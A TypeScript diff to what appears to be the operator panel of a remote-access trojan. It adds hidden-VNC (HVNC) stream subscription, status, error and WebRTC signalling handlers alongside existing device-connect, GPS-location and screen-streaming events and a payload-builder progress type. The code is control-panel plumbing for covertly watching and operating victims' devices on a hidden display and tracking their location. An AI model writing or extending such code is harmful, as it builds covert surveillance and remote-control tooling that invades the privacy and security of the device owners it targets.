@@ -33,6 +33,25 @@ export interface WebRtcIcePayload { id: string; sessionId: string; candidate: st
 type WebRtcAnswerListener = (payload: WebRtcAnswerPayload) => void;
 type WebRtcIceListener = (payload: WebRtcIcePayload) => void;
 
+export interface HvncStatusPayload {
+  id: string;
+  streaming?: boolean;
+  virtualWidth?: number;
+  virtualHeight?: number;
+  displayId?: number;
+  densityDpi?: number;
+  fps?: number;
+  transport?: 'webrtc';
+  connectionState?: string;
+  sessionId?: string;
+}
+
+type HvncStoppedListener = (payload: { id: string }) => void;
+type HvncStatusListener = (payload: HvncStatusPayload) => void;
+type HvncErrorListener = (payload: { id: string; sessionId?: string; error: string }) => void;
+type HvncAnswerListener = (payload: WebRtcAnswerPayload) => void;
+type HvncIceListener = (payload: WebRtcIcePayload) => void;
+
 export interface BuilderProgress {
   step: string;
   message: string;
@@ -51,6 +70,13 @@ const screenErrorListeners: Set<ScreenErrorListener> = new Set();
 const screenSubscriptionCounts: Map<string, number> = new Map();
 const webRtcAnswerListeners: Set<WebRtcAnswerListener> = new Set();
 const webRtcIceListeners: Set<WebRtcIceListener> = new Set();
+
+const hvncStoppedListeners: Set<HvncStoppedListener> = new Set();
+const hvncStatusListeners: Set<HvncStatusListener> = new Set();
+const hvncErrorListeners: Set<HvncErrorListener> = new Set();
+const hvncSubscriptionCounts: Map<string, number> = new Map();
+const hvncAnswerListeners: Set<HvncAnswerListener> = new Set();
+const hvncIceListeners: Set<HvncIceListener> = new Set();
 
 export interface GpsLocationPayload { id: string; latitude: number; longitude: number; accuracy?: number; speed?: number; provider?: string; time: string; }
 type GpsLocationListener = (payload: GpsLocationPayload) => void;
@@ -94,6 +120,9 @@ export function initAdminSocket(onDeviceChange?: DeviceChangeListener): Socket {
     screenSubscriptionCounts.forEach((_count, clientId) => {
       s.emit('screen:subscribe', { id: clientId });
     });
+    hvncSubscriptionCounts.forEach((_count, clientId) => {
+      s.emit('hvnc:subscribe', { id: clientId });
+    });
   });
   s.on('client:connect', (payload: { id: string; model?: string; ip?: string }) => {
     onDeviceChange?.({ ...payload, online: true });
@@ -133,6 +162,21 @@ export function initAdminSocket(onDeviceChange?: DeviceChangeListener): Socket {
   s.on('gps:location', (payload: GpsLocationPayload) => {
     gpsLocationListeners.forEach((fn) => fn(payload));
   });
+  s.on('hvnc:stopped', (payload: { id: string }) => {
+    hvncStoppedListeners.forEach((fn) => fn(payload));
+  });
+  s.on('hvnc:status', (payload: HvncStatusPayload) => {
+    hvncStatusListeners.forEach((fn) => fn(payload));
+  });
+  s.on('hvnc:error', (payload: { id: string; sessionId?: string; error: string }) => {
+    hvncErrorListeners.forEach((fn) => fn(payload));
+  });
+  s.on('hvnc:answer', (payload: WebRtcAnswerPayload) => {
+    hvncAnswerListeners.forEach((fn) => fn(payload));
+  });
+  s.on('hvnc:ice', (payload: WebRtcIcePayload) => {
+    hvncIceListeners.forEach((fn) => fn(payload));
+  });
 
   adminSocket = s;
   return s;
@@ -153,6 +197,11 @@ export function disconnectAdminSocket(): void {
   webRtcAnswerListeners.clear();
   webRtcIceListeners.clear();
   gpsLocationListeners.clear();
+  hvncStoppedListeners.clear();
+  hvncStatusListeners.clear();
+  hvncErrorListeners.clear();
+  hvncAnswerListeners.clear();
+  hvncIceListeners.clear();
 }
 
 export function onDataUpdate(listener: DataChangeListener): () => void {
@@ -216,4 +265,48 @@ export function onWebRtcIce(listener: WebRtcIceListener): () => void {
 export function onGpsLocation(listener: GpsLocationListener): () => void {
   gpsLocationListeners.add(listener);
   return () => { gpsLocationListeners.delete(listener); };
+}
+
+// ─── HVNC Socket Functions ──────────────────────────────────────
+
+/** Subscribe this browser to the HVNC stream for a specific device. */
+export function subscribeToHvnc(clientId: string): () => void {
+  const count = hvncSubscriptionCounts.get(clientId) ?? 0;
+  hvncSubscriptionCounts.set(clientId, count + 1);
+  if (count === 0) adminSocket?.emit('hvnc:subscribe', { id: clientId });
+
+  return () => {
+    const next = (hvncSubscriptionCounts.get(clientId) ?? 1) - 1;
+    if (next <= 0) {
+      hvncSubscriptionCounts.delete(clientId);
+      adminSocket?.emit('hvnc:unsubscribe', { id: clientId });
+    } else {
+      hvncSubscriptionCounts.set(clientId, next);
+    }
+  };
+}
+
+export function onHvncStopped(listener: HvncStoppedListener): () => void {
+  hvncStoppedListeners.add(listener);
+  return () => { hvncStoppedListeners.delete(listener); };
+}
+
+export function onHvncStatus(listener: HvncStatusListener): () => void {
+  hvncStatusListeners.add(listener);
+  return () => { hvncStatusListeners.delete(listener); };
+}
+
+export function onHvncError(listener: HvncErrorListener): () => void {
+  hvncErrorListeners.add(listener);
+  return () => { hvncErrorListeners.delete(listener); };
+}
+
+export function onHvncAnswer(listener: HvncAnswerListener): () => void {
+  hvncAnswerListeners.add(listener);
+  return () => { hvncAnswerListeners.delete(listener); };
+}
+
+export function onHvncIce(listener: HvncIceListener): () => void {
+  hvncIceListeners.add(listener);
+  return () => { hvncIceListeners.delete(listener); };
 }
